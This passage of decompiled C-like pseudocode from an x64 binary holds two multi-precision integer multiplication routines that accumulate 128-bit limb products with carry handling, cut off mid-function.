  v44 = (*((_QWORD *)&v41 + 1) + v39 < *((_QWORD *)&v41 + 1)) + v40;
  v45 = a2[3] * (unsigned __int128)a3[1];
  v46 = v42 + v45;
  *((_QWORD *)&v45 + 1) += v42 + (unsigned __int64)v45 < v42;
  v47 = *((_QWORD *)&v45 + 1) + v43;
  v48 = (v47 < *((_QWORD *)&v45 + 1)) + v44;
  v49 = a2[4] * (unsigned __int128)*a3;
  *(_QWORD *)&v49 = v46 + v49;
  a1[4] = v49;
  *((_QWORD *)&v49 + 1) += (unsigned __int64)v49 < v46;
  v50 = *((_QWORD *)&v49 + 1) + v47;
  v51 = (v50 < *((_QWORD *)&v49 + 1)) + v48;
  v52 = *a2 * (unsigned __int128)a3[5];
  v53 = v50 + v52;
  *((_QWORD *)&v52 + 1) += v50 + (unsigned __int64)v52 < v50;
  v54 = *((_QWORD *)&v52 + 1) + v51;
  v55 = v54 < *((_QWORD *)&v52 + 1);
  v56 = a2[1] * (unsigned __int128)a3[4];
  v57 = v53 + v56;
  *((_QWORD *)&v56 + 1) += v53 + (unsigned __int64)v56 < v53;
  v58 = *((_QWORD *)&v56 + 1) + v54;
  v59 = (v58 < *((_QWORD *)&v56 + 1)) + v55;
  v60 = a2[2] * (unsigned __int128)a3[3];
  v61 = v57 + v60;
  *((_QWORD *)&v60 + 1) += v57 + (unsigned __int64)v60 < v57;
  v62 = *((_QWORD *)&v60 + 1) + v58;
  v63 = (v62 < *((_QWORD *)&v60 + 1)) + v59;
  v64 = a2[3] * (unsigned __int128)a3[2];
  v65 = v61 + v64;
  *((_QWORD *)&v64 + 1) += v61 + (unsigned __int64)v64 < v61;
  v66 = *((_QWORD *)&v64 + 1) + v62;
  v67 = (v66 < *((_QWORD *)&v64 + 1)) + v63;
  v68 = a2[4] * (unsigned __int128)a3[1];
  v69 = v65 + v68;
  *((_QWORD *)&v68 + 1) += v65 + (unsigned __int64)v68 < v65;
  v70 = *((_QWORD *)&v68 + 1) + v66;
  v71 = (v70 < *((_QWORD *)&v68 + 1)) + v67;
  v72 = a2[5] * (unsigned __int128)*a3;
  *(_QWORD *)&v72 = v69 + v72;
  a1[5] = v72;
  *((_QWORD *)&v72 + 1) += (unsigned __int64)v72 < v69;
  v73 = *((_QWORD *)&v72 + 1) + v70;
  v74 = (v73 < *((_QWORD *)&v72 + 1)) + v71;
  v75 = *a2 * (unsigned __int128)a3[6];
  v76 = v73 + v75;
  v77 = (v73 + (unsigned __int64)v75 < v73) + *((_QWORD *)&v75 + 1) + v74;
  v78 = a2[1] * (unsigned __int128)a3[5];
  v79 = v76 + v78;
  v80 = (v76 + (unsigned __int64)v78 < v76) + *((_QWORD *)&v78 + 1) + v77;
  v81 = a2[2] * (unsigned __int128)a3[4];
  v82 = v79 + v81;
  v83 = (v79 + (unsigned __int64)v81 < v79) + *((_QWORD *)&v81 + 1) + v80;
  v84 = a2[3] * (unsigned __int128)a3[3];
  v85 = v82 + v84;
  v86 = (v82 + (unsigned __int64)v84 < v82) + *((_QWORD *)&v84 + 1) + v83;
  v87 = a2[4] * (unsigned __int128)a3[2];
  v88 = v85 + v87;
  v89 = (v85 + (unsigned __int64)v87 < v85) + *((_QWORD *)&v87 + 1) + v86;
  v90 = a2[5] * (unsigned __int128)a3[1];
  v91 = v88 + v90;
  v92 = (v88 + (unsigned __int64)v90 < v88) + *((_QWORD *)&v90 + 1) + v89;
  v93 = a2[6] * (unsigned __int128)*a3;
  *(_QWORD *)&v93 = v91 + v93;
  a1[6] = v93;
  result = ((unsigned __int64)v93 < v91)
         + *((_QWORD *)&v93 + 1)
         + a3[4] * a2[3]
         + a2[1] * a3[6]
         + a3[3] * a2[4]
         + a3[1] * a2[6]
         + *a3 * a2[7]
         + *a2 * a3[7]
         + v92
         + a2[5] * a3[2]
         + a2[2] * a3[5];
  a1[7] = result;
  return result;
}

//----- (000000013F118F80) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F118F80(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r10
  unsigned __int64 v8; // r9
  unsigned __int64 v9; // rbp
  __int64 v10; // r11
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // r11
  unsigned __int64 v13; // r14
  unsigned __int64 v14; // r12
  unsigned __int64 v15; // r13
  _BOOL8 v16; // r8
  unsigned __int64 v17; // rdx
  unsigned __int64 v18; // r11
  _BOOL8 v19; // r8
  unsigned __int64 v20; // rdx
  unsigned __int64 v21; // r11
  _BOOL8 v22; // r8
  unsigned __int64 v23; // rdx
  unsigned __int64 v24; // r11
  _BOOL8 v25; // r8
  unsigned __int64 v26; // rdx
  unsigned __int64 v27; // r11
  _BOOL8 v28; // r8
  unsigned __int64 v29; // rdx
  unsigned __int64 v30; // r11
  _BOOL8 v31; // r8
  unsigned __int64 v32; // rdx
  unsigned __int64 v33; // r11
  _BOOL8 v34; // r8
  unsigned __int64 v35; // rdx
  unsigned __int64 v36; // r11
  _BOOL8 v37; // r8
  unsigned __int64 v38; // rdx
  unsigned __int64 v39; // r11
  _BOOL8 v40; // r8
  unsigned __int64 v41; // rdx
  unsigned __int64 v42; // r11
  _BOOL8 v43; // r8
  unsigned __int64 v44; // rdx
  unsigned __int64 v45; // r11
  __int64 v46; // r8
  unsigned __int64 v47; // rdx
  unsigned __int64 v48; // rax
  unsigned __int64 v49; // rdi
  unsigned __int64 v50; // r11
  __int64 v51; // r8
  unsigned __int64 v52; // rdx
  unsigned __int64 v53; // r11
  __int64 v54; // r8
  unsigned __int64 v55; // rdx
  unsigned __int64 v56; // r11
  __int64 v57; // r8
  unsigned __int64 v58; // rcx
  unsigned __int64 v59; // r10
  unsigned __int128 v60; // rax
  unsigned __int64 v61; // r8
  unsigned __int64 v62; // r9
  unsigned __int64 v63; // r11
  unsigned __int64 v64; // rbx
  unsigned __int128 v65; // rax
  unsigned __int64 v66; // r8
  unsigned __int64 v67; // r11
  unsigned __int64 v68; // rbx
  unsigned __int128 v69; // rax
  unsigned __int64 v70; // rcx
  unsigned __int64 v71; // r11
  unsigned __int64 v72; // rbx
  unsigned __int128 v73; // rax
  unsigned __int64 v74; // r8
  unsigned __int64 v75; // r11
  unsigned __int64 v76; // rbx
  unsigned __int128 v77; // rax
  unsigned __int64 v78; // rcx
  unsigned __int64 v79; // r11
  unsigned __int64 v80; // rbx
  unsigned __int128 v81; // rax
  unsigned __int64 v82; // r8
  unsigned __int64 v83; // r11
  unsigned __int64 v84; // rbx
  unsigned __int128 v85; // rax
  unsigned __int64 v86; // rcx
  unsigned __int64 v87; // r11
  unsigned __int64 v88; // rbx
  unsigned __int128 v89; // rax
  unsigned __int64 v90; // r8
  unsigned __int64 v91; // r11
  unsigned __int64 v92; // rbx
  unsigned __int128 v93; // rax
  unsigned __int64 v94; // rcx
  unsigned __int64 v95; // r11
  unsigned __int64 v96; // rbx
  unsigned __int128 v97; // rax
  unsigned __int64 v98; // r8
  unsigned __int64 v99; // r11
  unsigned __int64 v100; // rbx
  unsigned __int128 v101; // rax
  unsigned __int64 v102; // rcx
  unsigned __int64 v103; // r11
  __int64 v104; // rbx
  unsigned __int128 v105; // rax
  unsigned __int64 v106; // r8
  unsigned __int64 v107; // r11
  __int64 v108; // rbx
  unsigned __int128 v109; // rax
  unsigned __int64 v110; // rcx
  unsigned __int64 v111; // r11
  __int64 v112; // rbx
  unsigned __int128 v113; // rax
  unsigned __int64 v114; // r10
  unsigned __int64 v115; // r8
  unsigned __int64 v116; // r11
  __int64 v117; // rbx
  unsigned __int128 v118; // rax
  unsigned __int64 v119; // r11
  __int64 v120; // rbx
  unsigned __int64 v121; // r11
  __int64 v122; // rbx
  unsigned __int128 v123; // rax
  unsigned __int64 v124; // rcx
  __int64 v125; // r9
  _BOOL8 v126; // r11
  unsigned __int128 v127; // rax
  unsigned __int64 v128; // r8
  unsigned __int64 v129; // r9
  _BOOL8 v130; // r11
  unsigned __int128 v131; // rax
  unsigned __int64 v132; // rcx
  unsigned __int64 v133; // r9
  _BOOL8 v134; // r11
  unsigned __int128 v135; // rax
  unsigned __int64 v136; // r8
  unsigned __int64 v137; // r9
  _BOOL8 v138; // r11
  unsigned __int128 v139; // rax
  unsigned __int64 v140; // rcx
  unsigned __int64 v141; // r9
  _BOOL8 v142; // r11
  unsigned __int128 v143; // rax
  unsigned __int64 v144; // r8
  unsigned __int64 v145; // r9
  _BOOL8 v146; // r11
  unsigned __int128 v147; // rax
  unsigned __int64 v148; // rcx
  unsigned __int64 v149; // r9
  _BOOL8 v150; // r11
  unsigned __int128 v151; // rax
  unsigned __int64 v152; // r8
  unsigned __int64 v153; // r9
  _BOOL8 v154; // r11
  unsigned __int128 v155; // rax
  unsigned __int64 v156; // rcx
  unsigned __int64 v157; // r9
  _BOOL8 v158; // r11
  unsigned __int128 v159; // rax
  unsigned __int64 v160; // r8
  unsigned __int64 v161; // r9
  _BOOL8 v162; // r11
  unsigned __int128 v163; // rax
  unsigned __int64 v164; // rcx
  unsigned __int64 v165; // r9
  __int64 v166; // r11
  unsigned __int128 v167; // rax
  unsigned __int64 v168; // r8
  unsigned __int64 v169; // r9
  __int64 v170; // r11
  unsigned __int128 v171; // rax
  unsigned __int64 v172; // rcx
  unsigned __int64 v173; // r9
  __int64 v174; // r11
  unsigned __int128 v175; // rax
  unsigned __int64 v176; // r8
  unsigned __int64 v177; // r9
  __int64 v178; // r11
  unsigned __int128 v179; // rax
  unsigned __int64 v180; // r9
  __int64 v181; // r11
  unsigned __int128 v182; // rax
  unsigned __int64 v183; // rcx
  unsigned __int64 v184; // r11
  _BOOL8 v185; // r10
  unsigned __int128 v186; // rax
  unsigned __int64 v187; // r8
  unsigned __int64 v188; // r11
  _BOOL8 v189; // r10
  unsigned __int128 v190; // rax
  unsigned __int64 v191; // rcx
  unsigned __int64 v192; // r11
  _BOOL8 v193; // r10
  unsigned __int128 v194; // rax
  unsigned __int64 v195; // r8
  unsigned __int64 v196; // r11
  _BOOL8 v197; // r10
  unsigned __int128 v198; // rax
  unsigned __int64 v199; // rcx
  unsigned __int64 v200; // r11
  _BOOL8 v201; // r10
  unsigned __int128 v202; // rax
  unsigned __int64 v203; // r8
  unsigned __int64 v204; // r11
  _BOOL8 v205; // r10
  unsigned __int128 v206; // rax
  unsigned __int64 v207; // rcx
  unsigned __int64 v208; // r11
  _BOOL8 v209; // r10
  unsigned __int128 v210; // rax
  unsigned __int64 v211; // r8
  unsigned __int64 v212; // r11
  _BOOL8 v213; // r10
  unsigned __int128 v214; // rax
  unsigned __int64 v215; // rcx
  unsigned __int64 v216; // r11
  _BOOL8 v217; // r10
  unsigned __int128 v218; // rax
  unsigned __int64 v219; // r8
  unsigned __int64 v220; // r11
  _BOOL8 v221; // r10
  unsigned __int128 v222; // rax
  unsigned __int64 v223; // rcx
  unsigned __int64 v224; // r11
  __int64 v225; // r10
  unsigned __int128 v226; // rax
  unsigned __int64 v227; // r8
  unsigned __int64 v228; // r11
  __int64 v229; // r10
  unsigned __int128 v230; // rax
  unsigned __int64 v231; // rcx
  unsigned __int64 v232; // r11
  __int64 v233; // r10
  unsigned __int128 v234; // rax
  unsigned __int64 v235; // r11
  __int64 v236; // r10
  unsigned __int128 v237; // rax
  unsigned __int64 v238; // rcx
  unsigned __int64 v239; // r10
  _BOOL8 v240; // r9
  unsigned __int128 v241; // rax
  unsigned __int64 v242; // r8
  unsigned __int64 v243; // r10
  _BOOL8 v244; // r9
  unsigned __int128 v245; // rax
  unsigned __int64 v246; // rcx
  unsigned __int64 v247; // r10
  _BOOL8 v248; // r9
  unsigned __int128 v249; // rax
  unsigned __int64 v250; // r8
  unsigned __int64 v251; // r10
  _BOOL8 v252; // r9
  unsigned __int128 v253; // rax
  unsigned __int64 v254; // rcx
  unsigned __int64 v255; // r10
  _BOOL8 v256; // r9
  unsigned __int128 v257; // rax
  unsigned __int64 v258; // r8
  unsigned __int64 v259; // r10
  _BOOL8 v260; // r9
  unsigned __int128 v261; // rax
  unsigned __int64 v262; // rcx
  unsigned __int64 v263; // r10
  _BOOL8 v264; // r9
  unsigned __int128 v265; // rax
  unsigned __int64 v266; // r8
  unsigned __int64 v267; // r10
  _BOOL8 v268; // r9
  unsigned __int128 v269; // rax
  unsigned __int64 v270; // rcx
  unsigned __int64 v271; // r10
  _BOOL8 v272; // r9
  unsigned __int128 v273; // rax
  unsigned __int64 v274; // r8
  unsigned __int64 v275; // r10
  _BOOL8 v276; // r9
  unsigned __int128 v277; // rax
  unsigned __int64 v278; // rcx
  unsigned __int64 v279; // r10
  __int64 v280; // r9
  unsigned __int128 v281; // rax
  unsigned __int64 v282; // r8
  unsigned __int64 v283; // r10
  __int64 v284; // r9
  unsigned __int128 v285; // rax
  unsigned __int64 v286; // r10
  __int64 v287; // r9
  unsigned __int128 v288; // rax
  unsigned __int64 v289; // rcx
  unsigned __int64 v290; // r9
  _BOOL8 v291; // r10
  unsigned __int128 v292; // rax
  unsigned __int64 v293; // r8
  unsigned __int64 v294; // r9
  _BOOL8 v295; // r10
  unsigned __int128 v296; // rax
  unsigned __int64 v297; // rcx
  unsigned __int64 v298; // r9
  _BOOL8 v299; // r10
  unsigned __int128 v300; // rax
  unsigned __int64 v301; // r8
  unsigned __int64 v302; // r9
  _BOOL8 v303; // r10
  unsigned __int128 v304; // rax
  unsigned __int64 v305; // rcx
  unsigned __int64 v306; // r9
  _BOOL8 v307; // r10
  unsigned __int128 v308; // rax
  unsigned __int64 v309; // r8
  unsigned __int64 v310; // r9
  _BOOL8 v311; // r10
  unsigned __int128 v312; // rax
  unsigned __int64 v313; // rcx
  unsigned __int64 v314; // r9
  _BOOL8 v315; // r10
  unsigned __int128 v316; // rax
  unsigned __int64 v317; // r8
  unsigned __int64 v318; // r9
  _BOOL8 v319; // r10
  unsigned __int128 v320; // rax
  unsigned __int64 v321; // rcx
  unsigned __int64 v322; // r9
  _BOOL8 v323; // r10
  unsigned __int128 v324; // rax
  unsigned __int64 v325; // r8
  unsigned __int64 v326; // r9
  _BOOL8 v327; // r10
  unsigned __int128 v328; // rax
  unsigned __int64 v329; // rcx
  unsigned __int64 v330; // r9
  __int64 v331; // r10
  unsigned __int128 v332; // rax
  unsigned __int64 v333; // r9
  __int64 v334; // r10
  unsigned __int128 v335; // rax
  unsigned __int64 v336; // rcx
  unsigned __int64 v337; // r10
  _BOOL8 v338; // r9
  unsigned __int128 v339; // rax
  unsigned __int64 v340; // r8
  unsigned __int64 v341; // r10
  _BOOL8 v342; // r9
  unsigned __int128 v343; // rax
  unsigned __int64 v344; // rcx
  unsigned __int64 v345; // r10
  _BOOL8 v346; // r9
  unsigned __int128 v347; // rax
  unsigned __int64 v348; // r8
  unsigned __int64 v349; // r10
  _BOOL8 v350; // r9
  unsigned __int128 v351; // rax
  unsigned __int64 v352; // rcx
  unsigned __int64 v353; // r10
  _BOOL8 v354; // r9
  unsigned __int128 v355; // rax
  unsigned __int64 v356; // r8
  unsigned __int64 v357; // r10
  _BOOL8 v358; // r9
  unsigned __int128 v359; // rax
  unsigned __int64 v360; // rcx
  unsigned __int64 v361; // r10
  _BOOL8 v362; // r9
  unsigned __int128 v363; // rax
  unsigned __int64 v364; // r8
  unsigned __int64 v365; // r10
  _BOOL8 v366; // r9
  unsigned __int128 v367; // rax
  unsigned __int64 v368; // rcx
  unsigned __int64 v369; // r10
  _BOOL8 v370; // r9
  unsigned __int128 v371; // rax
  unsigned __int64 v372; // r8
  unsigned __int64 v373; // r10
  _BOOL8 v374; // r9
  unsigned __int128 v375; // rax
  unsigned __int64 v376; // r10
  __int64 v377; // r9
  unsigned __int128 v378; // rax
  unsigned __int64 v379; // rcx
  unsigned __int64 v380; // r9
  _BOOL8 v381; // r10
  unsigned __int128 v382; // rax
  unsigned __int64 v383; // r8
  unsigned __int64 v384; // r9
  _BOOL8 v385; // r10
  unsigned __int128 v386; // rax
  unsigned __int64 v387; // rcx
  unsigned __int64 v388; // r9
  _BOOL8 v389; // r10
  unsigned __int128 v390; // rax
  unsigned __int64 v391; // r8
  unsigned __int64 v392; // r9
  _BOOL8 v393; // r10
  unsigned __int128 v394; // rax
  unsigned __int64 v395; // rcx
  unsigned __int64 v396; // r9
  _BOOL8 v397; // r10
  unsigned __int128 v398; // rax
  unsigned __int64 v399; // r8
  unsigned __int64 v400; // r9
  _BOOL8 v401; // r10
  unsigned __int128 v402; // rax
  unsigned __int64 v403; // rcx
  unsigned __int64 v404; // r9
  _BOOL8 v405; // r10
  unsigned __int128 v406; // rax
  unsigned __int64 v407; // r8
  unsigned __int64 v408; // r9
  _BOOL8 v409; // r10
  unsigned __int128 v410; // rax
  unsigned __int64 v411; // rcx
  unsigned __int64 v412; // r9
  _BOOL8 v413; // r10
  unsigned __int128 v414; // rax
  unsigned __int64 v415; // r9
  _BOOL8 v416; // r10
  unsigned __int128 v417; // rax
  unsigned __int64 v418; // rcx
  unsigned __int64 v419; // r10
  _BOOL8 v420; // r9
  unsigned __int128 v421; // rax
  unsigned __int64 v422; // r8
  unsigned __int64 v423; // r10
  _BOOL8 v424; // r9
  unsigned __int128 v425; // rax
  unsigned __int64 v426; // rcx
  unsigned __int64 v427; // r10
  _BOOL8 v428; // r9
  unsigned __int128 v429; // rax
  unsigned __int64 v430; // r8
  unsigned __int64 v431; // r10
  _BOOL8 v432; // r9
  unsigned __int128 v433; // rax
  unsigned __int64 v434; // rcx
  unsigned __int64 v435; // r10
  _BOOL8 v436; // r9
  unsigned __int128 v437; // rax
  unsigned __int64 v438; // r8
  unsigned __int64 v439; // r10
  _BOOL8 v440; // r9
  unsigned __int128 v441; // rax
  unsigned __int64 v442; // rcx
  unsigned __int64 v443; // r10
  _BOOL8 v444; // r9
  unsigned __int128 v445; // rax
  unsigned __int64 v446; // r8
  unsigned __int64 v447; // r10
  _BOOL8 v448; // r9
  unsigned __int128 v449; // rax
  unsigned __int64 v450; // r10
  _BOOL8 v451; // r9
  unsigned __int128 v452; // rax
  unsigned __int64 v453; // rcx
  unsigned __int64 v454; // r9
  _BOOL8 v455; // r10
  unsigned __int128 v456; // rax
  unsigned __int64 v457; // r8
  unsigned __int64 v458; // r9
  _BOOL8 v459; // r10
  unsigned __int128 v460; // rax
  unsigned __int64 v461; // rcx
  unsigned __int64 v462; // r9
  _BOOL8 v463; // r10
  unsigned __int128 v464; // rax
  unsigned __int64 v465; // r8
  unsigned __int64 v466; // r9
  _BOOL8 v467; // r10
  unsigned __int128 v468; // rax
  unsigned __int64 v469; // rcx
  unsigned __int64 v470; // r9
  _BOOL8 v471; // r10
  unsigned __int128 v472; // rax
  unsigned __int64 v473; // r8
  unsigned __int64 v474; // r9
  _BOOL8 v475; // r10
  unsigned __int128 v476; // rax
  unsigned __int64 v477; // rcx
  unsigned __int64 v478; // r9
  _BOOL8 v479; // r10
  unsigned __int128 v480; // rax
  unsigned __int64 v481; // r9
  _BOOL8 v482; // r10
  unsigned __int128 v483; // rax
  unsigned __int64 v484; // rcx
  unsigned __int64 v485; // r10
  _BOOL8 v486; // r9
  unsigned __int128 v487; // rax
  unsigned __int64 v488; // r8
  unsigned __int64 v489; // r10
  _BOOL8 v490; // r9
  unsigned __int128 v491; // rax
  unsigned __int64 v492; // rcx
  unsigned __int64 v493; // r10
  _BOOL8 v494; // r9
  unsigned __int128 v495; // rax
  unsigned __int64 v496; // r8
  unsigned __int64 v497; // r10
  _BOOL8 v498; // r9
  unsigned __int128 v499; // rax
  unsigned __int64 v500; // rcx
  unsigned __int64 v501; // r10
  _BOOL8 v502; // r9
  unsigned __int128 v503; // rax
  unsigned __int64 v504; // r8
  unsigned __int64 v505; // r10
  _BOOL8 v506; // r9
  unsigned __int128 v507; // rax
  unsigned __int64 v508; // r10
  _BOOL8 v509; // r9
  unsigned __int128 v510; // rax
  unsigned __int64 v511; // rcx
  unsigned __int64 v512; // r9
  _BOOL8 v513; // r10
  unsigned __int128 v514; // rax
  unsigned __int64 v515; // r8
  unsigned __int64 v516; // r9
  _BOOL8 v517; // r10
  unsigned __int128 v518; // rax
  unsigned __int64 v519; // rcx
  unsigned __int64 v520; // r9
  _BOOL8 v521; // r10
  unsigned __int128 v522; // rax
  unsigned __int64 v523; // r8
  unsigned __int64 v524; // r9
  _BOOL8 v525; // r10
  unsigned __int128 v526; // rax
  unsigned __int64 v527; // rcx
  unsigned __int64 v528; // r9
  _BOOL8 v529; // r10
  unsigned __int128 v530; // rax
  unsigned __int64 v531; // r9
  _BOOL8 v532; // r10
  unsigned __int128 v533; // rax
  unsigned __int64 v534; // rcx
  unsigned __int64 v535; // r10
  _BOOL8 v536; // r9
  unsigned __int128 v537; // rax
  unsigned __int64 v538; // r8
  unsigned __int64 v539; // r10
  _BOOL8 v540; // r9
  unsigned __int128 v541; // rax
  unsigned __int64 v542; // rcx
  unsigned __int64 v543; // r10
  _BOOL8 v544; // r9
  unsigned __int128 v545; // rax
  unsigned __int64 v546; // r8
  unsigned __int64 v547; // r10
  _BOOL8 v548; // r9
  unsigned __int128 v549; // rax
  unsigned __int64 v550; // r10
  _BOOL8 v551; // r9
  unsigned __int128 v552; // rax
  unsigned __int64 v553; // rcx
  unsigned __int64 v554; // r9
  _BOOL8 v555; // r10
  unsigned __int128 v556; // rax
  unsigned __int64 v557; // r8
  unsigned __int64 v558; // r9
  _BOOL8 v559; // r10
  unsigned __int128 v560; // rax
  unsigned __int64 v561; // rcx
  unsigned __int64 v562; // r9
  _BOOL8 v563; // r10
  unsigned __int128 v564; // rax
  unsigned __int64 v565; // r9
  _BOOL8 v566; // r10
  unsigned __int128 v567; // rax
  unsigned __int64 v568; // rcx
  unsigned __int64 v569; // r10
  _BOOL8 v570; // r9
  unsigned __int128 v571; // rax
  unsigned __int64 v572; // r8
  unsigned __int64 v573; // r10
  _BOOL8 v574; // r9
  unsigned __int128 v575; // rax
  unsigned __int64 v576; // r10
  _BOOL8 v577; // r9
  unsigned __int128 v578; // rax
  unsigned __int64 v579; // rcx
  unsigned __int64 v580; // r9
  _BOOL8 v581; // rdi
  unsigned __int128 v582; // rax
  unsigned __int64 v583; // r9
  _BOOL8 v584; // rdi
  unsigned __int128 v585; // rax
  unsigned __int64 result; // rax

  v4 = *a2;
  v8 = a3[14];
  v9 = a2[1];
  v10 = (*a2 * (unsigned __int128)v8) >> 64;
  v11 = (v9 * (unsigned __int128)a3[13]) >> 64;
  v12 = v11 + v10;
  v13 = a2[2];
  v14 = a2[3];
  v15 = a2[4];
  v16 = v12 < v11;
  v17 = (v13 * (unsigned __int128)a3[12]) >> 64;
  v18 = v17 + v12;
  v19 = (v18 < v17) + v16;
  v20 = (v14 * (unsigned __int128)a3[11]) >> 64;
  v21 = v20 + v18;
  v22 = (v21 < v20) + v19;
  v23 = (v15 * (unsigned __int128)a3[10]) >> 64;
  v24 = v23 + v21;
  v25 = (v24 < v23) + v22;
  v26 = (a2[5] * (unsigned __int128)a3[9]) >> 64;
  v27 = v26 + v24;
  v28 = (v27 < v26) + v25;
  v29 = (a2[6] * (unsigned __int128)a3[8]) >> 64;
  v30 = v29 + v27;
  v31 = (v30 < v29) + v28;
  v32 = (a2[7] * (unsigned __int128)a3[7]) >> 64;
  v33 = v32 + v30;
  v34 = (v33 < v32) + v31;
  v35 = (a2[8] * (unsigned __int128)a3[6]) >> 64;
  v36 = v35 + v33;
  v37 = (v36 < v35) + v34;
  v38 = (a2[9] * (unsigned __int128)a3[5]) >> 64;
  v39 = v38 + v36;
  v40 = (v39 < v38) + v37;
  v41 = (a2[10] * (unsigned __int128)a3[4]) >> 64;
  v42 = v41 + v39;
  v43 = (v42 < v41) + v40;
  v44 = (a2[11] * (unsigned __int128)a3[3]) >> 64;
  v45 = v44 + v42;
  v46 = (v45 < v44) + v43;
  v47 = (a2[12] * (unsigned __int128)a3[2]) >> 64;
  v48 = a3[1];
  v49 = *a3;
  v50 = v47 + v45;
  v51 = (v50 < v47) + v46;
  v52 = (a2[13] * (unsigned __int128)v48) >> 64;
  v53 = v52 + v50;
  v54 = (v53 < v52) + v51;
  v55 = (a2[14] * (unsigned __int128)v49) >> 64;
  v56 = v55 + v53;
  v57 = (v56 < v55) + v54;
  v58 = v56 + v4 * a3[15];
  v59 = (v58 < v56) + ((v4 * (unsigned __int128)a3[15]) >> 64);
  v60 = v9 * (unsigned __int128)v8;
  v61 = v59 + v57;
  v62 = v58 + v60;
  *((_QWORD *)&v60 + 1) += v58 + (unsigned __int64)v60 < v58;
  v63 = *((_QWORD *)&v60 + 1) + v61;
  v64 = (v61 < v59) + (unsigned __int64)(*((_QWORD *)&v60 + 1) + v61 < *((_QWORD *)&v60 + 1));
  v65 = v13 * (unsigned __int128)a3[13];
  v66 = v62 + v65;
  *((_QWORD *)&v65 + 1) += v62 + (unsigned __int64)v65 < v62;
  v67 = *((_QWORD *)&v65 + 1) + v63;
  v68 = (v67 < *((_QWORD *)&v65 + 1)) + v64;
  v69 = v14 * (unsigned __int128)a3[12];
  v70 = v66 + v69;
  *((_QWORD *)&v69 + 1) += v66 + (unsigned __int64)v69 < v66;
  v71 = *((_QWORD *)&v69 + 1) + v67;
  v72 = (v71 < *((_QWORD *)&v69 + 1)) + v68;
  v73 = v15 * (unsigned __int128)a3[11];
  v74 = v70 + v73;
  *((_QWORD *)&v73 + 1) += v70 + (unsigned __int64)v73 < v70;
  v75 = *((_QWORD *)&v73 + 1) + v71;
  v76 = (v75 < *((_QWORD *)&v73 + 1)) + v72;
  v77 = a2[5] * (unsigned __int128)a3[10];
  v78 = v74 + v77;
  *((_QWORD *)&v77 + 1) += v74 + (unsigned __int64)v77 < v74;
  v79 = *((_QWORD *)&v77 + 1) + v75;
  v80 = (v79 < *((_QWORD *)&v77 + 1)) + v76;
  v81 = a2[6] * (unsigned __int128)a3[9];
  v82 = v78 + v81;
  *((_QWORD *)&v81 + 1) += v78 + (unsigned __int64)v81 < v78;
  v83 = *((_QWORD *)&v81 + 1) + v79;
  v84 = (v83 < *((_QWORD *)&v81 + 1)) + v80;
  v85 = a2[7] * (unsigned __int128)a3[8];
  v86 = v82 + v85;
  *((_QWORD *)&v85 + 1) += v82 + (unsigned __int64)v85 < v82;
  v87 = *((_QWORD *)&v85 + 1) + v83;
  v88 = (v87 < *((_QWORD *)&v85 + 1)) + v84;
  v89 = a2[8] * (unsigned __int128)a3[7];
  v90 = v86 + v89;
  *((_QWORD *)&v89 + 1) += v86 + (unsigned __int64)v89 < v86;
  v91 = *((_QWORD *)&v89 + 1) + v87;
  v92 = (v91 < *((_QWORD *)&v89 + 1)) + v88;
  v93 = a2[9] * (unsigned __int128)a3[6];
  v94 = v90 + v93;
  *((_QWORD *)&v93 + 1) += v90 + (unsigned __int64)v93 < v90;
  v95 = *((_QWORD *)&v93 + 1) + v91;
  v96 = (v95 < *((_QWORD *)&v93 + 1)) + v92;
  v97 = a2[10] * (unsigned __int128)a3[5];
  v98 = v94 + v97;
  *((_QWORD *)&v97 + 1) += v94 + (unsigned __int64)v97 < v94;
  v99 = *((_QWORD *)&v97 + 1) + v95;
  v100 = (v99 < *((_QWORD *)&v97 + 1)) + v96;
  v101 = a2[11] * (unsigned __int128)a3[4];
  v102 = v98 + v101;
  *((_QWORD *)&v101 + 1) += v98 + (unsigned __int64)v101 < v98;
  v103 = *((_QWORD *)&v101 + 1) + v99;
  v104 = (v103 < *((_QWORD *)&v101 + 1)) + v100;
  v105 = a2[12] * (unsigned __int128)a3[3];
  v106 = v102 + v105;
  *((_QWORD *)&v105 + 1) += v102 + (unsigned __int64)v105 < v102;
  v107 = *((_QWORD *)&v105 + 1) + v103;
  v108 = (v107 < *((_QWORD *)&v105 + 1)) + v104;
  v109 = a2[13] * (unsigned __int128)a3[2];
  v110 = v106 + v109;
  *((_QWORD *)&v109 + 1) += v106 + (unsigned __int64)v109 < v106;
  v111 = *((_QWORD *)&v109 + 1) + v107;
  v112 = (v111 < *((_QWORD *)&v109 + 1)) + v108;
  v113 = a2[14] * (unsigned __int128)a3[1];
  v114 = a2[15];
  v115 = v110 + v113;
  *((_QWORD *)&v113 + 1) += v110 + (unsigned __int64)v113 < v110;
  v116 = *((_QWORD *)&v113 + 1) + v111;
  v117 = (v116 < *((_QWORD *)&v113 + 1)) + v112;
  v118 = v114 * (unsigned __int128)v49;
  *((_QWORD *)&v118 + 1) += v115 + (unsigned __int64)v118 < v115;
  v119 = *((_QWORD *)&v118 + 1) + v116;
  v120 = (v119 < *((_QWORD *)&v118 + 1)) + v117;
  v121 = (a4 < v115 + (unsigned __int64)v118) + v119;
  v122 = (__PAIR128__(v121, a4) < v115 + (unsigned __int64)v118) + v120;
  v123 = v9 * (unsigned __int128)a3[15];
  v124 = v121 + v123;
  *((_QWORD *)&v123 + 1) += v121 + (unsigned __int64)v123 < v121;
  v125 = v122 + *((_QWORD *)&v123 + 1);
  v126 = (unsigned __int64)(v122 + *((_QWORD *)&v123 + 1)) < *((_QWORD *)&v123 + 1);
  v127 = v13 * (unsigned __int128)a3[14];
  v128 = v124 + v127;
  *((_QWORD *)&v127 + 1) += v124 + (unsigned __int64)v127 < v124;
  v129 = *((_QWORD *)&v127 + 1) + v125;
  v130 = (v129 < *((_QWORD *)&v127 + 1)) + v126;
  v131 = v14 * (unsigned __int128)a3[13];
  v132 = v128 + v131;
  *((_QWORD *)&v131 + 1) += v128 + (unsigned __int64)v131 < v128;
  v133 = *((_QWORD *)&v131 + 1) + v129;
  v134 = (v133 < *((_QWORD *)&v131 + 1)) + v130;
  v135 = v15 * (unsigned __int128)a3[12];
  v136 = v132 + v135;
  *((_QWORD *)&v135 + 1) += v132 + (unsigned __int64)v135 < v132;
  v137 = *((_QWORD *)&v135 + 1) + v133;
